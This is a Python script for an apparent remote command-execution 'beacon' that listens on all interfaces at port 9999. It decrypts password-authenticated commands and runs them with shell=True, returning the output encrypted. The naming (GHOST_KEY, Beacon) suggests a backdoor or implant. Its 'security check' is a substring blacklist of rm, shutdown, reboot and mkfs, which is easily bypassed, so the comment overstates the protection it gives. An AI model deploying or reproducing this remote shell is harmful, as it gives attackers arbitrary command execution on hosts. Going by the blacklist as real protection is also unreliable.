import socket
import subprocess
import os
from cryptography.fernet import Fernet
from dotenv import load_dotenv

# Load secrets from .env
load_dotenv()

class BeaconServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        # Fetching from .env for security
        self.key = os.getenv("GHOST_KEY").encode()
        self.password = os.getenv("GHOST_PASS")
        self.cipher = Fernet(self.key)
        self.blacklist = ["rm", "shutdown", "reboot", "mkfs"]

    def is_safe(self, cmd):
        """Basic security check against a blacklist."""
        return not any(bad_word in cmd for bad_word in self.blacklist)

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Allows the port to be reused immediately after a crash
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port))
            s.listen(5)
            print(f"[*] Beacon Online. Listening on {self.host}:{self.port}...")

            while True:
                conn, addr = s.accept()
                with conn:
                    try:
                        # Receive encrypted data
                        encrypted_data = conn.recv(4096)
                        decrypted = self.cipher.decrypt(encrypted_data).decode()
                        
                        pwd, cmd = decrypted.split(":", 1)

                        if pwd == self.password and self.is_safe(cmd):
                            # Execute the shell command
                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                            response = output if output else b"Success: Command executed."
                        else:
                            response = b"Denied: Authentication failed or command forbidden."

                        # Send back the encrypted result
                        conn.send(self.cipher.encrypt(response))
                    except Exception as e:
                        print(f"[!] Connection error from {addr}: {e}")

if __name__ == "__main__":
    server = BeaconServer()
    server.start()